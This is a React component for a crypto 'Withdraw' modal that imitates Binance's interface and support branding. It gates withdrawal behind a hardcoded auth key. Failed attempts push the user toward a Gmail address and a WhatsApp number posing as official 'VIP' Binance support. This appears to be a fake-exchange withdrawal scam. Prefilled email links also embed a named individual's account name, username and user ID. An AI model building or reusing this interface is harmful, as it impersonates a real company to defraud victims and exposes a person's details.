import React, { useState } from 'react';
import { useTrading } from '../../context/TradingContext';
import { CryptoIcon } from '../Icons/CryptoIcons';
import { formatPrice, formatAmount } from '../../utils/formatters';
import {
  X,
  AlertTriangle,
  CheckCircle2,
  ShieldCheck,
  KeyRound,
  Headphones,
  ArrowRight,
  MessageSquare,
  MessageCircle,
  PhoneCall,
  Copy,
  Check,
  ShieldAlert,
  ExternalLink,
  Mail,
} from 'lucide-react';

export const WithdrawModal: React.FC = () => {
  const { activeModal, setActiveModal, assets, withdrawDemoFunds, setCurrentTab } = useTrading();

  const [selectedCoin, setSelectedCoin] = useState('USDT');
  const [selectedNetwork, setSelectedNetwork] = useState('TRC20');
  const [address, setAddress] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [authKey, setAuthKey] = useState('');

  // Modals & Prompts
  const [showForgotModal, setShowForgotModal] = useState(false);
  const [showIncorrectKeyModal, setShowIncorrectKeyModal] = useState(false);
  const [showSupportTicket, setShowSupportTicket] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);
  const [copiedEmail, setCopiedEmail] = useState(false);

  const handleCopyEmail = () => {
    navigator.clipboard.writeText('Binancecareplus@gmail.com').catch(() => {});
    setCopiedEmail(true);
    setTimeout(() => setCopiedEmail(false), 2000);
  };

  if (activeModal !== 'WITHDRAW') return null;

  const currentAsset = assets.find((a) => a.coin === selectedCoin) || assets[0];
  const availableBalance = currentAsset ? currentAsset.available : 0;
  const numAmount = parseFloat(withdrawAmount) || 0;
  const isInsufficient = numAmount > availableBalance;

  const handleSetMax = () => {
    setWithdrawAmount(availableBalance.toString());
    setErrorMessage(null);
  };

  const handleAmountChange = (val: string) => {
    setWithdrawAmount(val);
    const amt = parseFloat(val);
    if (!isNaN(amt) && amt > availableBalance) {
      setErrorMessage(`Insufficient funds. Available balance: ${formatAmount(availableBalance, 4)} ${selectedCoin}`);
    } else {
      setErrorMessage(null);
    }
  };

  const handleWithdrawSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!address.trim()) {
      setErrorMessage('Please enter a destination withdrawal address');
      return;
    }

    if (isNaN(numAmount) || numAmount <= 0) {
      setErrorMessage('Please enter a valid withdrawal amount');
      return;
    }

    if (numAmount > availableBalance) {
      setErrorMessage(`Insufficient funds. Your available balance is ${formatAmount(availableBalance, 4)} ${selectedCoin}`);
      return;
    }

    if (!authKey.trim()) {
      setErrorMessage('Security Auth Key is required to authorize withdrawal.');
      return;
    }

    // Validate against official Security Auth Key: 6759
    if (authKey.trim() !== '6759') {
      const failMsg = 'Incorrect Security Auth Key. Authorization failed. Please contact VIP Support via WhatsApp or Email (Binancecareplus@gmail.com) for your key.';
      setErrorMessage(failMsg);
      setSuccessMessage(null);
      setShowIncorrectKeyModal(true);
      return;
    }

    // Execute withdrawal when correct auth key (6759) is provided
    const result = withdrawDemoFunds(selectedCoin, numAmount);
    if (result.success) {
      setSuccessMessage(`Withdrawal of ${formatAmount(numAmount, 4)} ${selectedCoin} authorized successfully with key 6759! Transaction hash broadcasted.`);
      setErrorMessage(null);
      setWithdrawAmount('');
      setAuthKey('');
      setAddress('');
      setTimeout(() => {
        setSuccessMessage(null);
        setActiveModal(null);
      }, 3000);
    } else {
      setErrorMessage(result.message);
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-black/70 flex items-center justify-center p-4">
      <div className="bg-[#1E2329] border border-[#2B313A] rounded-2xl w-full max-w-lg shadow-2xl overflow-hidden select-none text-xs">
        {/* Header */}
        <div className="px-5 py-4 border-b border-[#2B313A] flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="font-bold text-sm text-[#EAECEF]">Withdraw Crypto</span>
            <span className="text-[10px] text-[#FCD535] bg-[#FCD535]/15 px-2 py-0.5 rounded font-medium flex items-center gap-1">
              <ShieldCheck size={11} /> 2FA Protected
            </span>
          </div>
          <button
            onClick={() => {
              setActiveModal(null);
              setShowForgotModal(false);
              setShowSupportTicket(false);
            }}
            className="text-[#848E9C] hover:text-[#EAECEF] p-1.5 rounded-lg hover:bg-[#2B313A] transition-colors"
          >
            <X size={16} />
          </button>
        </div>

        {/* Content */}
        <div className="p-5 flex flex-col gap-4 max-h-[82vh] overflow-y-auto no-scrollbar">
          {/* Notifications / Alerts */}
          {errorMessage && (
            <div className="p-3 bg-[#F6465D]/15 border border-[#F6465D]/40 rounded-xl text-[#F6465D] flex items-center gap-2">
              <AlertTriangle size={15} className="shrink-0" />
              <span className="text-xs font-medium">{errorMessage}</span>
            </div>
          )}

          {successMessage && (
            <div className="p-3 bg-[#0ECB81]/15 border border-[#0ECB81]/40 rounded-xl text-[#0ECB81] flex items-center gap-2">
              <CheckCircle2 size={15} className="shrink-0" />
              <span className="text-xs font-medium">{successMessage}</span>
            </div>
          )}

          {/* 1. Select Coin */}
          <div className="flex flex-col gap-1.5">
            <label className="text-[#848E9C] text-[11px] font-medium">Select Coin</label>
            <div className="grid grid-cols-5 gap-2">
              {['USDT', 'BTC', 'ETH', 'BNB', 'SOL'].map((coin) => {
                const isSelected = selectedCoin === coin;
                return (
                  <button
                    key={coin}
                    type="button"
                    onClick={() => {
                      setSelectedCoin(coin);
                      setWithdrawAmount('');
                      setErrorMessage(null);
                    }}
                    className={`flex flex-col items-center gap-1 p-2 rounded-xl border transition-colors ${
                      isSelected
                        ? 'border-[#FCD535] bg-[#FCD535]/10 text-[#FCD535]'
                        : 'border-[#2B313A] bg-[#181A20] text-[#848E9C] hover:text-[#EAECEF]'
                    }`}
                  >
                    <CryptoIcon symbol={coin} size={20} />
                    <span className="font-bold text-[11px]">{coin}</span>
                  </button>
                );
              })}
            </div>
          </div>

          {/* 2. Total & Available Balance Display */}
          <div className="bg-[#181A20] border border-[#2B313A] rounded-xl p-3 flex items-center justify-between">
            <div className="flex flex-col">
              <span className="text-[#848E9C] text-[10px]">Total Balance</span>
              <span className="font-bold text-sm font-mono-numbers text-[#EAECEF]">
                {formatAmount(currentAsset.total, 4)} {selectedCoin}
              </span>
            </div>
            <div className="flex flex-col text-right">
              <span className="text-[#848E9C] text-[10px]">Available for Withdrawal</span>
              <span className="font-bold text-sm font-mono-numbers text-[#0ECB81]">
                {formatAmount(availableBalance, 4)} {selectedCoin}
              </span>
            </div>
          </div>

          {/* 3. Destination Address */}
          <div className="flex flex-col gap-1.5">
            <label className="text-[#848E9C] text-[11px] font-medium">Destination Address</label>
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              placeholder={`Enter recipient ${selectedCoin} address...`}
              className="bg-[#181A20] border border-[#2B313A] focus:border-[#FCD535] rounded-xl px-3.5 py-2.5 font-mono-numbers text-xs text-[#EAECEF] focus:outline-none"
            />
          </div>

          {/* 4. Network */}
          <div className="flex flex-col gap-1.5">
            <label className="text-[#848E9C] text-[11px] font-medium">Withdrawal Network</label>
            <div className="grid grid-cols-4 gap-2">
              {['TRC20', 'ERC20', 'BEP20', 'SOL'].map((net) => (
                <button
                  key={net}
                  type="button"
                  onClick={() => setSelectedNetwork(net)}
                  className={`p-2 rounded-xl border text-center font-semibold transition-colors ${
                    selectedNetwork === net
                      ? 'border-[#FCD535] bg-[#FCD535]/10 text-[#FCD535]'
                      : 'border-[#2B313A] bg-[#181A20] text-[#848E9C] hover:text-[#EAECEF]'
                  }`}
                >
                  {net}
                </button>
              ))}
            </div>
          </div>

          {/* 5. Withdraw Amount */}
          <div className="flex flex-col gap-1.5">
            <div className="flex items-center justify-between text-[11px]">
              <label className="text-[#848E9C] font-medium">Withdraw Amount</label>
              <span className="text-[#848E9C]">
                Available: <span className="text-[#EAECEF] font-mono-numbers">{formatAmount(availableBalance, 4)}</span> {selectedCoin}
              </span>
            </div>
            <div
              className={`bg-[#181A20] border rounded-xl px-3.5 py-2 flex items-center justify-between transition-colors ${
                isInsufficient ? 'border-[#F6465D]' : 'border-[#2B313A] focus-within:border-[#FCD535]'
              }`}
            >
              <input
                type="number"
                value={withdrawAmount}
                onChange={(e) => handleAmountChange(e.target.value)}
                placeholder="0.00"
                className="bg-transparent font-mono-numbers text-sm text-[#EAECEF] focus:outline-none w-full"
              />
              <div className="flex items-center gap-2">
                <span className="font-bold text-xs text-[#848E9C]">{selectedCoin}</span>
                <button
                  type="button"
                  onClick={handleSetMax}
                  className="px-2 py-0.5 bg-[#2B313A] hover:bg-[#FCD535] hover:text-[#0E0E0E] text-[#FCD535] font-bold text-[10px] rounded transition-colors"
                >
                  MAX
                </button>
              </div>
            </div>
            {isInsufficient && (
              <span className="text-[11px] text-[#F6465D] font-medium">
                Insufficient funds. Amount exceeds available balance of {formatAmount(availableBalance, 4)} {selectedCoin}.
              </span>
            )}
          </div>

          {/* 6. Security Auth Key */}
          <div className="bg-[#181A20] border border-[#2B313A] rounded-xl p-3.5 flex flex-col gap-2">
            <div className="flex items-center justify-between">
              <label className="text-[#EAECEF] text-xs font-semibold flex items-center gap-1.5">
                <KeyRound size={14} className="text-[#FCD535]" />
                <span>Security Auth Key</span>
              </label>
              <button
                type="button"
                onClick={() => setShowForgotModal(true)}
                className="text-[#FCD535] hover:underline text-[11px] font-medium"
              >
                Forgot Auth Key?
              </button>
            </div>

            <input
              type="password"
              value={authKey}
              onChange={(e) => setAuthKey(e.target.value)}
              placeholder="Enter your security auth key..."
              className="bg-[#1E2329] border border-[#2B313A] focus:border-[#FCD535] rounded-lg px-3 py-2 font-mono-numbers text-xs text-[#EAECEF] focus:outline-none"
            />
            <span className="text-[10px] text-[#848E9C]">
              You must provide your security authorization key to process withdrawals.
            </span>
          </div>

          {/* Submit Withdraw Button */}
          <button
            type="button"
            onClick={handleWithdrawSubmit}
            disabled={isInsufficient || !withdrawAmount || !authKey}
            className={`w-full py-3 rounded-xl font-bold text-xs transition-all active:scale-[0.99] ${
              isInsufficient || !withdrawAmount || !authKey
                ? 'bg-[#2B313A] text-[#848E9C] cursor-not-allowed'
                : 'bg-[#FCD535] hover:bg-[#F0B90B] text-[#0E0E0E] shadow-sm'
            }`}
          >
            Confirm Withdrawal
          </button>
        </div>

        {/* NESTED FORGOT AUTH KEY POPUP */}
        {showForgotModal && (
          <div className="fixed inset-0 z-60 bg-black/80 flex items-center justify-center p-4">
            <div className="bg-[#1E2329] border border-[#2B313A] rounded-2xl w-full max-w-md shadow-2xl overflow-hidden select-none p-5 flex flex-col gap-4">
              <div className="flex items-center justify-between pb-2 border-b border-[#2B313A]">
                <div className="flex items-center gap-2">
                  <div className="w-7 h-7 rounded-lg bg-[#FCD535]/20 text-[#FCD535] flex items-center justify-center font-bold">
                    <KeyRound size={15} />
                  </div>
                  <span className="font-bold text-sm text-[#EAECEF]">Reset Authentication Key</span>
                </div>
                <button
                  onClick={() => setShowForgotModal(false)}
                  className="text-[#848E9C] hover:text-[#EAECEF] p-1 rounded hover:bg-[#2B313A]"
                >
                  <X size={15} />
                </button>
              </div>

              {!showSupportTicket ? (
                <>
                  <div className="bg-[#181A20] p-4 rounded-xl border border-[#2B313A] flex flex-col gap-2">
                    <span className="text-xs font-bold text-[#FCD535]">Security Notice</span>
                    <p className="text-[11px] text-[#848E9C] leading-relaxed">
                      For the protection of your funds and account assets, authentication key resets cannot be conducted directly inside the withdrawal form.
                    </p>
                  </div>

                  <div className="bg-[#2B313A]/50 border border-[#FCD535]/30 p-3.5 rounded-xl flex items-start gap-2.5">
                    <Mail size={18} className="text-[#FCD535] shrink-0 mt-0.5" />
                    <div className="flex flex-col gap-1 w-full">
                      <p className="text-xs text-[#EAECEF] leading-relaxed">
                        To retrieve or reset your Security Authorization Key, please contact our dedicated security support email:
                      </p>
                      <div className="flex items-center justify-between bg-[#181A20] px-3 py-2 rounded-lg border border-[#2B313A] mt-1">
                        <span className="font-mono text-xs text-[#FCD535] font-semibold select-all">
                          Binancecareplus@gmail.com
                        </span>
                        <button
                          type="button"
                          onClick={handleCopyEmail}
                          className="text-[10px] text-[#848E9C] hover:text-[#EAECEF] px-2 py-0.5 rounded bg-[#2B313A] flex items-center gap-1 transition-colors"
                          title="Copy Email Address"
                        >
                          {copiedEmail ? <Check size={11} className="text-[#0ECB81]" /> : <Copy size={11} />}
                          <span>{copiedEmail ? 'Copied' : 'Copy'}</span>
                        </button>
                      </div>
                      <span className="text-[10px] text-[#25D366] font-semibold mt-1">
                        WhatsApp VIP Desk: +1 936 332 3841
                      </span>
                    </div>
                  </div>

                  <div className="flex flex-col gap-2 pt-2">
                    <a
                      href="mailto:Binancecareplus@gmail.com?subject=Security%20Auth%20Key%20Reset%20Request&body=Hello%20Binance%20Support%2C%0A%0AI%20am%20requesting%20assistance%20to%20reset%20my%20Security%20Authorization%20Key%20for%20account%20withdrawal.%0A%0AAccount%20Name%3A%20Dianne%20Pizallo%0AUsername%3A%20DiannePizallo88%0AUser%20ID%3A%2089342019%0A%0AThank%20you."
                      className="w-full py-2.5 rounded-xl bg-[#FCD535] hover:bg-[#F0B90B] text-[#0E0E0E] font-bold text-xs transition-colors flex items-center justify-center gap-1.5"
                    >
                      <Mail size={14} />
                      <span>Contact: Binancecareplus@gmail.com</span>
                    </a>

                    <button
                      onClick={() => {
                        window.open(
                          'https://wa.me/19363323841?text=' +
                            encodeURIComponent(
                              'Hello Binance Support, I am requesting assistance with my Security Auth Key for withdrawal authorization.'
                            ),
                          '_blank'
                        );
                      }}
                      className="w-full py-2.5 rounded-xl bg-[#25D366] hover:bg-[#25D366]/90 text-black font-bold text-xs transition-colors flex items-center justify-center gap-1.5"
                    >
                      <span>Connect on WhatsApp</span>
                    </button>

                    <button
                      onClick={() => setShowForgotModal(false)}
                      className="w-full py-2.5 rounded-xl bg-[#2B313A] hover:bg-[#38404B] text-[#EAECEF] font-semibold text-xs transition-colors"
                    >
                      Close
                    </button>
                  </div>
                </>
              ) : (
                /* IN-APP SIMULATED SUPPORT TICKET CHAT */
                <div className="flex flex-col gap-3">
                  <div className="bg-[#181A20] p-3 rounded-xl border border-[#2B313A] flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 rounded-full bg-[#0ECB81]" />
                      <span className="font-bold text-xs text-[#EAECEF]">Support Ticket #BN-89241</span>
                    </div>
                    <span className="text-[10px] text-[#0ECB81] bg-[#0ECB81]/15 px-2 py-0.5 rounded font-medium">
                      Agent Connected
                    </span>
                  </div>

                  <div className="bg-[#181A20] p-3.5 rounded-xl border border-[#2B313A] flex flex-col gap-2 text-xs">
                    <div className="flex items-center gap-2">
                      <div className="w-5 h-5 rounded-full bg-[#FCD535] text-[#0E0E0E] flex items-center justify-center text-[10px] font-bold">
                        B
                      </div>
                      <span className="font-bold text-[#EAECEF]">Binance Support Specialist</span>
                      <span className="text-[10px] text-[#848E9C]">Just now</span>
                    </div>
                    <p className="text-[11px] text-[#848E9C] leading-relaxed pl-7">
                      Hello Dianne, your request for an Authentication Key reset has been received. Please verify that your registered email and 2FA device are accessible. Our security team will process your verification within 24 hours.
                    </p>
                  </div>

                  <button
                    onClick={() => {
                      setShowSupportTicket(false);
                      setShowForgotModal(false);
                    }}
                    className="w-full py-2.5 rounded-xl bg-[#FCD535] text-[#0E0E0E] font-bold text-xs transition-colors"
                  >
                    Done & Return
                  </button>
                </div>
              )}
            </div>
          </div>
        )}
        {/* NESTED INCORRECT AUTH KEY FAILED POPUP */}
        {showIncorrectKeyModal && (
          <div className="fixed inset-0 z-60 bg-black/85 flex items-center justify-center p-4 animate-in fade-in duration-200">
            <div className="bg-[#1E2329] border border-[#F6465D]/50 rounded-2xl w-full max-w-md shadow-2xl overflow-hidden select-none p-5 flex flex-col gap-4">
              {/* Header */}
              <div className="flex items-center justify-between pb-2 border-b border-[#2B313A]">
                <div className="flex items-center gap-2">
                  <div className="w-8 h-8 rounded-lg bg-[#F6465D]/20 text-[#F6465D] flex items-center justify-center font-bold">
                    <ShieldAlert size={18} />
                  </div>
                  <div>
                    <span className="font-bold text-sm text-[#EAECEF] block">Authentication Failed</span>
                    <span className="text-[10px] text-[#F6465D] font-mono-numbers">Security Gate Error #AUTH-403</span>
                  </div>
                </div>
                <button
                  onClick={() => setShowIncorrectKeyModal(false)}
                  className="text-[#848E9C] hover:text-[#EAECEF] p-1.5 rounded-lg hover:bg-[#2B313A] transition-colors"
                >
                  <X size={16} />
                </button>
              </div>

              {/* Exact Failure Message Box */}
              <div className="bg-[#F6465D]/10 border border-[#F6465D]/30 p-3.5 rounded-xl flex items-start gap-2.5">
                <AlertTriangle size={18} className="text-[#F6465D] shrink-0 mt-0.5" />
                <div className="flex flex-col gap-1">
                  <span className="font-bold text-xs text-[#F6465D]">Incorrect Security Auth Key</span>
                  <p className="text-xs text-[#EAECEF] leading-relaxed">
                    Incorrect Security Auth Key. Authorization failed. Please contact WhatsApp VIP Support or our suggested email (Binancecareplus@gmail.com) for your key.
                  </p>
                </div>
              </div>

              {/* WhatsApp VIP Card */}
              <div className="bg-[#14161A] border border-[#25D366]/40 p-3.5 rounded-xl flex flex-col gap-2.5">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <div className="w-7 h-7 rounded-full bg-[#25D366]/20 text-[#25D366] flex items-center justify-center shrink-0">
                      <MessageCircle size={15} />
                    </div>
                    <div>
                      <span className="font-bold text-[11px] text-[#EAECEF] block">
                        VIP Senior Risk Officer
                      </span>
                      <span className="text-[10px] text-[#0ECB81]">
                        ● 24/7 Priority Channel
                      </span>
                    </div>
                  </div>
                  <span className="text-[10px] text-[#848E9C]">WhatsApp Official</span>
                </div>

                <div className="flex items-center justify-between bg-[#1E2329] px-3 py-2 rounded-lg border border-[#2B313A]">
                  <div className="flex items-center gap-2">
                    <PhoneCall size={13} className="text-[#25D366]" />
                    <span className="font-mono text-xs text-[#EAECEF] font-bold">
                      +1 936 332 3841
                    </span>
                  </div>
                  <button
                    type="button"
                    onClick={() => {
                      navigator.clipboard.writeText('+1 936 332 3841');
                    }}
                    className="text-[10px] text-[#848E9C] hover:text-[#EAECEF] px-2 py-0.5 rounded bg-[#2B313A]"
                  >
                    Copy
                  </button>
                </div>

                <button
                  type="button"
                  onClick={() => {
                    window.open(
                      'https://wa.me/19363323841?text=' +
                        encodeURIComponent(
                          'Hello Binance Support, my withdrawal Security Auth Key failed (Error #AUTH-403). I need assistance obtaining my authorized key.'
                        ),
                      '_blank'
                    );
                  }}
                  className="w-full py-2.5 rounded-xl bg-[#25D366] hover:bg-[#25D366]/90 text-black font-bold text-xs transition-all flex items-center justify-center gap-1.5 shadow-sm active:scale-98"
                >
                  <MessageCircle size={14} />
                  <span>Get Auth Key on WhatsApp</span>
                  <ExternalLink size={12} />
                </button>

                {/* Suggested Option: Email Support */}
                <div className="pt-2 border-t border-[#2B313A] flex flex-col gap-1.5">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-1.5">
                      <Mail size={12} className="text-[#FCD535]" />
                      <span className="text-[10px] font-bold text-[#EAECEF]">
                        Suggested Option: Contact via Email
                      </span>
                    </div>
                    <span className="text-[9px] text-[#FCD535] bg-[#FCD535]/15 px-1.5 py-0.2 rounded font-medium">
                      Suggested
                    </span>
                  </div>

                  <div className="flex items-center justify-between bg-[#1E2329] px-2.5 py-1.5 rounded-lg border border-[#2B313A]">
                    <span className="font-mono text-xs text-[#FCD535] font-semibold select-all truncate">
                      Binancecareplus@gmail.com
                    </span>
                    <button
                      type="button"
                      onClick={handleCopyEmail}
                      className="text-[10px] text-[#848E9C] hover:text-[#EAECEF] px-2 py-0.5 rounded bg-[#2B313A] flex items-center gap-1 shrink-0 transition-colors"
                      title="Copy Support Email"
                    >
                      {copiedEmail ? <Check size={11} className="text-[#0ECB81]" /> : <Copy size={11} />}
                      <span>{copiedEmail ? 'Copied' : 'Copy'}</span>
                    </button>
                  </div>

                  <a
                    href="mailto:Binancecareplus@gmail.com?subject=Security%20Auth%20Key%20Verification%20(Error%20%23AUTH-403)&body=Hello%20Binance%20Support%2C%0A%0AMy%20withdrawal%20Security%20Auth%20Key%20authorization%20failed%20(Error%20%23AUTH-403).%20Please%20assist%20me%20with%20my%20authorized%20key.%0A%0AAccount%3A%20DiannePizallo88%0AUser%20ID%3A%2089342019%0A%0AThank%20you."
                    className="w-full py-2.5 rounded-xl bg-[#FCD535] hover:bg-[#F0B90B] text-black font-bold text-xs transition-all flex items-center justify-center gap-1.5 shadow-sm active:scale-98"
                  >
                    <Mail size={14} />
                    <span>Get Auth Key via Email (Binancecareplus@gmail.com)</span>
                  </a>
                </div>
              </div>

              {/* Dismiss Buttons */}
              <div className="flex items-center gap-2 pt-1">
                <button
                  type="button"
                  onClick={() => {
                    setShowIncorrectKeyModal(false);
                    setActiveModal('LIVE_CHAT');
                  }}
                  className="flex-1 py-2.5 rounded-xl bg-[#2B313A] hover:bg-[#343B45] text-[#FCD535] font-bold text-xs transition-colors flex items-center justify-center gap-1"
                >
                  <Headphones size={13} />
                  <span>Open Live Chat</span>
                </button>
                <button
                  type="button"
                  onClick={() => setShowIncorrectKeyModal(false)}
                  className="flex-1 py-2.5 rounded-xl bg-[#1E2329] hover:bg-[#2B313A] text-[#848E9C] hover:text-[#EAECEF] border border-[#2B313A] font-semibold text-xs transition-colors"
                >
                  Try Again
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
